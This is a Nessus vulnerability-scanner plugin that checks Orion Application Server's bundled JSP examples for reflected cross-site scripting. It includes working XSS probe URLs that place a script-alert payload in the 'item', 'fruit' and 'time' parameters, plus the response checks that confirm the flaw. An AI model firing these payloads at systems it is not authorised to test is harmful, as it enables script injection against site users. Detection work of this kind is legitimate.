#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40985);
  script_version("$Revision: 1.13 $");

  script_name(english:"Orion Application Server Web Examples Multiple XSS");
  script_summary(english:"Tries to inject script code into several examples");

  script_set_attribute( attribute:"synopsis",  value:
"The remote web server includes at least one JSP application that is
affected by a cross-site scripting vulnerability."  );
  script_set_attribute( attribute:"description",  value:
"The remote web server uses Orion Application Server, an application
server hosted on a Java2 platform. 

It currently makes available at least one example JSP application that
fails to sanitize user-supplied input before using it to generate
dynamic HTML output.  Specifically, the 'item' parameter of the
'examples/jsp/sessions/carts.jsp' script, the 'fruit' parameter of
'examples/jsp/checkbox/checkresult.jsp' script, and the 'time'
parameter of the 'examples/jsp/cal/cal2.jsp' script are known to be
affected.  An attacker may be able to leverage this to inject
arbitrary HTML and script code into a user's browser to be executed
within the security context of the affected site."  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://seclists.org/bugtraq/2009/Sep/29"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://seclists.org/bugtraq/2009/Jul/109"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Undeploy the web examples distributed with Orion."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/09/07"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/09/15"
  );
 script_cvs_date("$Date: 2016/11/17 15:28:26 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:orion:orion_application_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, no_xss: 1);

# Unless we're being paranoid, make sure the banner looks like Orion.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (! banner) exit(1, "No HTTP banner on port "+port);
  if ("Server: Orion/" >!< banner) exit(0, "Server response header on port "+port+" indicates it's not Orion.");
}


alert = string("<script>alert('", SCRIPT_NAME, "')</script>");
if (thorough_tests) 
{
  exploits = make_list(
    string('/examples/jsp/sessions/carts.jsp?item=', urlencode(str:"<body>"+alert+"</body>"), "&submit=add"),
    string('/examples/jsp/checkbox/checkresult.jsp?fruit=', urlencode(str:alert)),
    string('/examples/jsp/cal/cal2.jsp?time=', urlencode(str:alert))
  );
}
else
{
  exploits = make_list(
    string('/examples/jsp/sessions/carts.jsp?item=', urlencode(str:"<body>"+alert+"</body>"), "&submit=add")
  );
}


# Try to exploit the issue.
foreach exploit (exploits)
{
  res = http_send_recv3(method:"GET", item:exploit, port:port, exit_on_fail: 1);

  # There's a problem if we see our exploit in the output.
  if (
    (
      "carts.jsp" >< exploit &&
      "You have the following items in your cart:" >< res[2] &&
      string('<li> <body>', alert, '</body>') >< res[2]
    ) ||
    (
      "checkresult.jsp" >< exploit &&
      "The checked fruits" >< res[2] &&
      alert >< res[2]
    ) ||
    (
      "cal2.jsp" >< exploit &&
      string('<BR> Time ', alert, ' </h3>') >< res[2]
    )
  )
  {
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);

    if (report_verbosity > 0)
    {
      set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

      report = string(
        "\n",
        "Nessus was able to exploit the issue using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:exploit), "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
